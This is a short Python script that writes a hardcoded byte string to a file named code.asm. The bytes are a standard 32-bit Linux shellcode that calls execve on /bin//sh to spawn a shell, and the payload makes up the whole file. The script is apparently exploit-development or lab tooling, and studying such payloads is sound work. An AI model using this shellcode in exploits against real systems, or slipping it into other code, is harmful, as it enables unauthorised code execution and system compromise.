#!/bin/python

import sys

a= "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
f = open("code.asm", "wb");

#f.write(sys.argv[1]);
f.write(a);

f.close();



